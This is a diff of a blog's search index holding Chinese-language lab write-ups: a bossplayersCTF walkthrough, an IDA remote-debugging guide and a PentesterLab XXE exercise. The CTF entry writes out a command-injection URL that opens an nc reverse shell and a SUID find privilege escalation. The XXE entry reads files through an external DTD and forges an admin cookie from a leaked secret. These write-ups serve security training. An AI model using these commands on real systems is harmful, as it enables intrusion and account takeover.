@@ -1064,181 +1064,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>bossplayersCTF</title>
-    <url>/2020/06/08/azq0ps/</url>
-    <content><![CDATA[<p>扫不到 IP 问题：<br>可以参考之前的文章：</p>
-<p>改了之后就扫到了</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1591574739083-1259d69e-c26f-499d-8413-5609270cdeba.png#align=left&display=inline&height=114&margin=%5Bobject%20Object%5D&name=image.png&originHeight=154&originWidth=779&size=44135&status=done&style=none&width=568" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>nmap -p- -A 192.168.149.173 扫描一下端口</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1591574784385-136cf246-5b13-4a33-bd2b-332a31a69577.png#align=left&display=inline&height=392&margin=%5Bobject%20Object%5D&name=image.png&originHeight=592&originWidth=1022&size=138440&status=done&style=none&width=677" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>查看网页源码，最下面有个 base64，解出来看看</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1591575004358-27fba04c-a500-4618-b1ac-8e366508647d.png#align=left&display=inline&height=45&margin=%5Bobject%20Object%5D&name=image.png&originHeight=50&originWidth=697&size=4031&status=done&style=stroke&width=617" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>解了 3 次，解出来个 workinginprogress.php</p>
-<p>访问一下，看着这个页面莫名其妙的感觉应该有命令执行…试了一下…这…</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1591575211272-5539210e-6028-4f1a-97c6-fdb0aaaeee89.png#align=left&display=inline&height=502&margin=%5Bobject%20Object%5D&name=image.png&originHeight=697&originWidth=622&size=47414&status=done&style=stroke&width=447" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>kali 上面监听一下</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1591575376624-40872441-22b5-4c6b-9689-0ff4c5a6bad7.png#align=left&display=inline&height=65&margin=%5Bobject%20Object%5D&name=image.png&originHeight=67&originWidth=281&size=7074&status=done&style=none&width=262" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>访问一下：<br><a href="http://192.168.149.173/workinginprogress.php?cmd=nc" target="_blank" rel="noopener">http://192.168.149.173/workinginprogress.php?cmd=nc</a> -e /bin/sh 192.168.149.141 6666</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1591575441105-4762bc50-cbf0-4039-aac4-c3339fa20291.png#align=left&display=inline&height=195&margin=%5Bobject%20Object%5D&name=image.png&originHeight=236&originWidth=683&size=35188&status=done&style=none&width=562" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>python -c “import pty;pty.spawn(‘/bin/bash’)” 打开一个交互 shell</p>
-<p>find / -user root -perm -4000 -print 2&gt;/dev/null<br>看一下哪一些程序用 root 权限运行的</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1591576098070-cd26aef5-8371-426f-be20-b8145e182a88.png#align=left&display=inline&height=237&margin=%5Bobject%20Object%5D&name=image.png&originHeight=341&originWidth=851&size=58674&status=done&style=none&width=588" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>find . -exec /bin/sh -p ; -quit</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1591576337707-62127f02-8f31-4a2f-8c9d-4ed30fb85788.png#align=left&display=inline&height=217&margin=%5Bobject%20Object%5D&name=image.png&originHeight=296&originWidth=795&size=54045&status=done&style=none&width=582" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-]]></content>
-  </entry>
-  <entry>
-    <title>IDA远程调试</title>
-    <url>/2020/02/19/bfte1r/</url>
-    <content><![CDATA[<h1 id="IDA-远程调试"><a href="#IDA-远程调试" class="headerlink" title="IDA 远程调试"></a>IDA 远程调试</h1><p>把 IDA 文件夹下的 dbgsrv 里面的 linux 的复制到虚拟机，然后给权限  <code>chmod 777 文件名</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582202105456-eddb6ac9-f240-4706-9d4d-fc75280820d1.png#align=left&display=inline&height=382&name=image.png&originHeight=628&originWidth=873&size=73047&status=done&style=none&width=531" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-<p><code>./linux_server</code>  运行</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582202056038-a3bfd17f-7f78-4226-8d01-9724e95512c5.png#align=left&display=inline&height=225&name=image.png&originHeight=364&originWidth=967&size=77821&status=done&style=none&width=598" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>这样，再用 IDA  选这个，设置好主机名（虚拟机 IP）和密码（虚拟机密码）</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582203132658-f133fec2-e77d-4ef6-bad1-26db73c042c4.png#align=left&display=inline&height=274&name=image.png&originHeight=437&originWidth=959&size=84669&status=done&style=none&width=600" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582203197665-28533fa7-6167-4d73-a05f-9330480534c1.png#align=left&display=inline&height=325&name=image.png&originHeight=376&originWidth=704&size=23556&status=done&style=none&width=609" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>然后 F9  运行，因为在 linux 上面没有文件，所以他会复制到 linux，一路 ok 就可以</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582203483613-5b02af89-9b5e-4d78-b16a-0c083d5b024c.png#align=left&display=inline&height=379&name=image.png&originHeight=1080&originWidth=1920&size=216749&status=done&style=none&width=674" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582203524382-6855f5c3-3585-4106-ad06-073491ea4b7a.png#align=left&display=inline&height=341&name=image.png&originHeight=682&originWidth=1000&size=202387&status=done&style=none&width=500" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<h1 id="附加进程调试"><a href="#附加进程调试" class="headerlink" title="附加进程调试"></a>附加进程调试</h1><p>首先绑定一个，就相当于是在服务器上的题目了</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582203976462-bda683ba-9aa5-40be-85b3-83a4f381be35.png#align=left&display=inline&height=138&name=image.png&originHeight=276&originWidth=694&size=31860&status=done&style=none&width=347" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>然后用  python  的  pwntools  与程序连接</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582204420761-33601522-e0f2-44fb-8ea1-364d0a9e388e.png#align=left&display=inline&height=196&name=image.png&originHeight=392&originWidth=663&size=57315&status=done&style=none&width=331.5" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>在 IDA  里面，选择附加，然后选择  linux 的</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582203928607-b44b8f9a-d01f-4933-ae61-7bcab3fb1a77.png#align=left&display=inline&height=302&name=image.png&originHeight=504&originWidth=866&size=49123&status=done&style=none&width=519" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>选择就行了</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582204619252-d640c5a3-bc1f-48eb-96bc-657a7c2f0986.png#align=left&display=inline&height=419&name=image.png&originHeight=640&originWidth=583&size=47804&status=done&style=none&width=381" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<hr>
-<h2 id="警告"><a href="#警告" class="headerlink" title="警告"></a>警告</h2><p>调试器无法附加到所选的进程。<br>这可能表示进程刚刚终止，或者您没有必要的权限。</p>
-<hr>
-<h2 id="OK"><a href="#OK" class="headerlink" title="OK"></a>OK</h2><p>没解决</p>
-]]></content>
-  </entry>
-  <entry>
     <title>PWN入门（堆利用）</title>
     <url>/2020/04/16/ape5up/</url>
     <content><![CDATA[<h1 id="first-fit"><a href="#first-fit" class="headerlink" title="first_fit"></a>first_fit</h1><p>源码：</p>
@@ -1663,6 +1488,181 @@
             </figure>
 
 <p>构造 chunk 的时候要注意绕过一些检查：<br>后面那三个特殊的标志位前两个必须都为 0，写 size 位的时候直接 0xN0 就可以了，然后大小要注意符合 fastbin 的大小，next chunk 的大小也要注意，必须大于 2*SIZE_SZ，小于 av-&gt;system_mem<br>64 位下：16&lt; next chunk 的 size &lt; 128</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>bossplayersCTF</title>
+    <url>/2020/06/08/azq0ps/</url>
+    <content><![CDATA[<p>扫不到 IP 问题：<br>可以参考之前的文章：</p>
+<p>改了之后就扫到了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1591574739083-1259d69e-c26f-499d-8413-5609270cdeba.png#align=left&display=inline&height=114&margin=%5Bobject%20Object%5D&name=image.png&originHeight=154&originWidth=779&size=44135&status=done&style=none&width=568" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>nmap -p- -A 192.168.149.173 扫描一下端口</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1591574784385-136cf246-5b13-4a33-bd2b-332a31a69577.png#align=left&display=inline&height=392&margin=%5Bobject%20Object%5D&name=image.png&originHeight=592&originWidth=1022&size=138440&status=done&style=none&width=677" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>查看网页源码，最下面有个 base64，解出来看看</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1591575004358-27fba04c-a500-4618-b1ac-8e366508647d.png#align=left&display=inline&height=45&margin=%5Bobject%20Object%5D&name=image.png&originHeight=50&originWidth=697&size=4031&status=done&style=stroke&width=617" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>解了 3 次，解出来个 workinginprogress.php</p>
+<p>访问一下，看着这个页面莫名其妙的感觉应该有命令执行…试了一下…这…</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1591575211272-5539210e-6028-4f1a-97c6-fdb0aaaeee89.png#align=left&display=inline&height=502&margin=%5Bobject%20Object%5D&name=image.png&originHeight=697&originWidth=622&size=47414&status=done&style=stroke&width=447" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>kali 上面监听一下</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1591575376624-40872441-22b5-4c6b-9689-0ff4c5a6bad7.png#align=left&display=inline&height=65&margin=%5Bobject%20Object%5D&name=image.png&originHeight=67&originWidth=281&size=7074&status=done&style=none&width=262" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>访问一下：<br><a href="http://192.168.149.173/workinginprogress.php?cmd=nc" target="_blank" rel="noopener">http://192.168.149.173/workinginprogress.php?cmd=nc</a> -e /bin/sh 192.168.149.141 6666</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1591575441105-4762bc50-cbf0-4039-aac4-c3339fa20291.png#align=left&display=inline&height=195&margin=%5Bobject%20Object%5D&name=image.png&originHeight=236&originWidth=683&size=35188&status=done&style=none&width=562" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>python -c “import pty;pty.spawn(‘/bin/bash’)” 打开一个交互 shell</p>
+<p>find / -user root -perm -4000 -print 2&gt;/dev/null<br>看一下哪一些程序用 root 权限运行的</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1591576098070-cd26aef5-8371-426f-be20-b8145e182a88.png#align=left&display=inline&height=237&margin=%5Bobject%20Object%5D&name=image.png&originHeight=341&originWidth=851&size=58674&status=done&style=none&width=588" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>find . -exec /bin/sh -p ; -quit</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1591576337707-62127f02-8f31-4a2f-8c9d-4ed30fb85788.png#align=left&display=inline&height=217&margin=%5Bobject%20Object%5D&name=image.png&originHeight=296&originWidth=795&size=54045&status=done&style=none&width=582" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+]]></content>
+  </entry>
+  <entry>
+    <title>IDA远程调试</title>
+    <url>/2020/02/19/bfte1r/</url>
+    <content><![CDATA[<h1 id="IDA-远程调试"><a href="#IDA-远程调试" class="headerlink" title="IDA 远程调试"></a>IDA 远程调试</h1><p>把 IDA 文件夹下的 dbgsrv 里面的 linux 的复制到虚拟机，然后给权限  <code>chmod 777 文件名</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582202105456-eddb6ac9-f240-4706-9d4d-fc75280820d1.png#align=left&display=inline&height=382&name=image.png&originHeight=628&originWidth=873&size=73047&status=done&style=none&width=531" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p><code>./linux_server</code>  运行</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582202056038-a3bfd17f-7f78-4226-8d01-9724e95512c5.png#align=left&display=inline&height=225&name=image.png&originHeight=364&originWidth=967&size=77821&status=done&style=none&width=598" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>这样，再用 IDA  选这个，设置好主机名（虚拟机 IP）和密码（虚拟机密码）</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582203132658-f133fec2-e77d-4ef6-bad1-26db73c042c4.png#align=left&display=inline&height=274&name=image.png&originHeight=437&originWidth=959&size=84669&status=done&style=none&width=600" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582203197665-28533fa7-6167-4d73-a05f-9330480534c1.png#align=left&display=inline&height=325&name=image.png&originHeight=376&originWidth=704&size=23556&status=done&style=none&width=609" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后 F9  运行，因为在 linux 上面没有文件，所以他会复制到 linux，一路 ok 就可以</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582203483613-5b02af89-9b5e-4d78-b16a-0c083d5b024c.png#align=left&display=inline&height=379&name=image.png&originHeight=1080&originWidth=1920&size=216749&status=done&style=none&width=674" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582203524382-6855f5c3-3585-4106-ad06-073491ea4b7a.png#align=left&display=inline&height=341&name=image.png&originHeight=682&originWidth=1000&size=202387&status=done&style=none&width=500" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h1 id="附加进程调试"><a href="#附加进程调试" class="headerlink" title="附加进程调试"></a>附加进程调试</h1><p>首先绑定一个，就相当于是在服务器上的题目了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582203976462-bda683ba-9aa5-40be-85b3-83a4f381be35.png#align=left&display=inline&height=138&name=image.png&originHeight=276&originWidth=694&size=31860&status=done&style=none&width=347" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后用  python  的  pwntools  与程序连接</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582204420761-33601522-e0f2-44fb-8ea1-364d0a9e388e.png#align=left&display=inline&height=196&name=image.png&originHeight=392&originWidth=663&size=57315&status=done&style=none&width=331.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>在 IDA  里面，选择附加，然后选择  linux 的</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582203928607-b44b8f9a-d01f-4933-ae61-7bcab3fb1a77.png#align=left&display=inline&height=302&name=image.png&originHeight=504&originWidth=866&size=49123&status=done&style=none&width=519" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>选择就行了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582204619252-d640c5a3-bc1f-48eb-96bc-657a7c2f0986.png#align=left&display=inline&height=419&name=image.png&originHeight=640&originWidth=583&size=47804&status=done&style=none&width=381" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<hr>
+<h2 id="警告"><a href="#警告" class="headerlink" title="警告"></a>警告</h2><p>调试器无法附加到所选的进程。<br>这可能表示进程刚刚终止，或者您没有必要的权限。</p>
+<hr>
+<h2 id="OK"><a href="#OK" class="headerlink" title="OK"></a>OK</h2><p>没解决</p>
 ]]></content>
   </entry>
   <entry>
@@ -10948,6 +10948,136 @@
 ]]></content>
   </entry>
   <entry>
+    <title>Pentester Lab: Play XML Entities</title>
+    <url>/2020/07/27/mysmtc/</url>
+    <content><![CDATA[<p>给了一个 iso 文件，打开就是 pentester 登录的状态，所以可以直接 ifconfig 去看 ip 地址</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595818224455-23f455a8-cc0c-4306-9800-2381de8f439d.png#align=left&display=inline&height=180&margin=%5Bobject%20Object%5D&name=image.png&originHeight=243&originWidth=748&size=13238&status=done&style=none&width=554" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>访问一下 ip</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595818545238-6fd0dd76-a566-4521-be5d-4450e084cd22.png#align=left&display=inline&height=296&margin=%5Bobject%20Object%5D&name=image.png&originHeight=591&originWidth=1223&size=64195&status=done&style=stroke&width=611.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p><code>python3 -m http.server 8080</code><br>python 开一个临时的服务，在提交表单的时候改成 xml（Content-Type 要改成 text/xml）</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595835562667-4d6ff2b5-9f29-45de-9b10-5538f56cd3d9.png#align=left&display=inline&height=458&margin=%5Bobject%20Object%5D&name=image.png&originHeight=916&originWidth=1603&size=267033&status=done&style=stroke&width=801.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>虽然服务器上没有这个东西，但是它确实去访问了</p>
+<p>接下来就要通过编辑这个 test.dtd 来获得一些东西</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595837327132-0578cf65-33b8-4783-a94f-ff3d242be819.png#align=left&display=inline&height=77&margin=%5Bobject%20Object%5D&name=image.png&originHeight=97&originWidth=904&size=59833&status=done&style=none&width=722" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>再去访问的时候就能拿到 /etc/passwd 的信息</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595837372747-88b1ad06-57d8-4e50-b0b0-1728dbcf4a22.png#align=left&display=inline&height=103&margin=%5Bobject%20Object%5D&name=image.png&originHeight=201&originWidth=1456&size=248335&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;sh</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;bin&#x2F;sh</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">tc:x:1001:50:Linux User,,,:&#x2F;home&#x2F;tc:&#x2F;bin&#x2F;sh</span><br><span class="line">pentesterlab:x:1000:50:Linux User,,,:&#x2F;home&#x2F;pentesterlab:&#x2F;bin&#x2F;sh</span><br><span class="line">play:x:100:65534:Linux User,,,:&#x2F;opt&#x2F;play-2.1.3&#x2F;xxe&#x2F;:&#x2F;bin&#x2F;false</span><br><span class="line">mysql:x:101:65534:Linux User,,,:&#x2F;home&#x2F;mysql:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure>
+
+<p>可以发现，play 用户的家目录是 /opt/play-2.1.3/xxe/</p>
+<p>把 test.dtd 改一下</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595837782746-ad72030b-8745-4916-b045-359a1b57ce07.png#align=left&display=inline&height=81&margin=%5Bobject%20Object%5D&name=image.png&originHeight=124&originWidth=920&size=82870&status=done&style=none&width=601" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后去访问</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.gitignore</span><br><span class="line">.settings</span><br><span class="line">app</span><br><span class="line">conf</span><br><span class="line">logs</span><br><span class="line">Aproject</span><br><span class="line">public</span><br><span class="line">README</span><br><span class="line">RUNNING_PID</span><br><span class="line">target</span><br><span class="line">test</span><br></pre></td></tr></table></figure>
+
+<p>再看一下 conf<br>application.conf<br>evolutions<br>routes</p>
+<p>在访问 routes 时候</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595839290310-0b4ec631-2b87-4e96-8d7b-ae8d1a65b54f.png#align=left&display=inline&height=111&margin=%5Bobject%20Object%5D&name=image.png&originHeight=222&originWidth=1460&size=367966&status=done&style=none&width=730" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>解码一下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;                           controllers.Application.index()</span><br><span class="line">GET     &#x2F;0ecf87346b9c0b370f8d63e6e7fed4f0             controllers.Application.secret_url()</span><br><span class="line">GET       &#x2F;login                   controllers.Application.login</span><br><span class="line">POST      &#x2F;login                   controllers.Application.login</span><br><span class="line">GET       &#x2F;logout                  controllers.Application.logout</span><br><span class="line"></span><br><span class="line">GET     &#x2F;assets&#x2F;*file               controllers.Assets.at(path&#x3D;&quot;&#x2F;public&quot;, file)</span><br></pre></td></tr></table></figure>
+
+<p>访问一下<br>/0ecf87346b9c0b370f8d63e6e7fed4f0</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595839415210-4c9e219c-08df-4eb0-bb27-c0171506b4f7.png#align=left&display=inline&height=254&margin=%5Bobject%20Object%5D&name=image.png&originHeight=414&originWidth=743&size=33976&status=done&style=stroke&width=456" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>再去访问一下 application.conf</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595839604331-330df1a1-62dc-428d-9289-07d3a6fb35b2.png#align=left&display=inline&height=63&margin=%5Bobject%20Object%5D&name=image.png&originHeight=126&originWidth=1450&size=196506&status=done&style=none&width=725" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>解码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">application.secret&#x3D;&quot;X7G@Abg53&#x3D;2p&#x3D;][5F;uMNDm&#x2F;QrDtVG0^iYHC3]Ov0t0E6b_amL16UynUbqS_?_eG&quot;</span><br><span class="line">application.langs&#x3D;&quot;en&quot;</span><br><span class="line">db.default.driver&#x3D;com.mysql.jdbc.Driver</span><br><span class="line">db.default.url&#x3D;&quot;mysql:&#x2F;&#x2F;pentesterlab:pentesterlab@localhost&#x2F;xxe&quot;</span><br><span class="line">ebean.default&#x3D;&quot;models.*&quot;</span><br><span class="line">logger.root&#x3D;ERROR</span><br><span class="line">logger.play&#x3D;INFO</span><br><span class="line">logger.application&#x3D;DEBUG</span><br></pre></td></tr></table></figure>
+
+<p>然后去看一下 framework/src/play/src/main/scala/play/api/mvc/Http.scala，可能太大的原因？并没有返回给我</p>
+<p>通过分析源码计算出 user=admin 应该用的 cookie</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line">key=<span class="string">"X7G@Abg53=2p=][5F;uMNDm/QrDtVG0^iYHC3]Ov0t0E6b_amL16UynUbqS_?_eG"</span></span><br><span class="line">data=<span class="string">"user=admin"</span></span><br><span class="line">h=hmac.new(key,data,hashlib.sha1)</span><br><span class="line">h.hexdigest()</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595848668980-0e3e057e-b189-4c41-a26c-43662b07956c.png#align=left&display=inline&height=206&margin=%5Bobject%20Object%5D&name=image.png&originHeight=296&originWidth=897&size=293566&status=done&style=none&width=625" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后 cookie 改成 PLAY_SESSION=”a5b8363ce748cfbb5d654edc3676d440173b33de-user=admin”</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595848875639-8ccf407b-3965-4907-b817-6042c43ed0af.png#align=left&display=inline&height=308&margin=%5Bobject%20Object%5D&name=image.png&originHeight=377&originWidth=539&size=39216&status=done&style=stroke&width=440" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
